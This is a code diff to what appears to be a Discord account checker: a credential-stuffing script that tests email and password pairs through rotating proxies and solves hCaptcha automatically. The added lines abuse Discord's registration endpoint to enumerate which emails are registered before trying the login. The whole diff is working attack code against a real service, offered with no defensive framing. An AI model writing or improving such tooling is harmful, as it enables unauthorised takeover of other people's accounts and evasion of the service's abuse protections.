@@ -2,8 +2,10 @@ from modules.variables import Checker
 from requests import Session
 from modules.functions import bad_proxy, log,save,set_proxy, return_proxy
 from requests.adapters import HTTPAdapter, Retry
-import functools
 from modules.functions import get_captcha
+from string import ascii_letters as l, digits as d
+from random import choices
+import functools
 
 def check(email:str,password:str):
     while 1:
@@ -17,6 +19,15 @@ def check(email:str,password:str):
                 retries = Retry(total=Checker.retries, backoff_factor=0.1)
                 s.mount('http://', HTTPAdapter(max_retries=retries))
                 s.mount('https://', HTTPAdapter(max_retries=retries))
+
+                payload = {"fingerprint":"793580565130641419.LGQ5IVlIkNTEQfpHbXcQLA2ABrM","email":email,"username":"".join(choices(l+d,k=6)),"password":"rth21e98!fmPP","invite":None,"consent":True,"date_of_birth":"1993-05-03","gift_code_sku_id":None,"captcha_key":None}
+                r = s.post("https://discord.com/api/v8/auth/register",json=payload).text
+                if "EMAIL_TYPE_INVALID_EMA" in r or "token" in r or "captcha-required" in r:
+                    Checker.bad += 1
+                    return_proxy(proxy)
+                    return
+                elif "EMAIL_ALREADY_REGISTERED" not  in r:
+                    raise
 
                 solution = get_captcha('f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34','https://discord.com/','hcaptcha')
                 payload = {"login": email, "password": password, "undelete": "false", "captcha_key": solution,"login_source": None, "gift_code_sku_id": None}
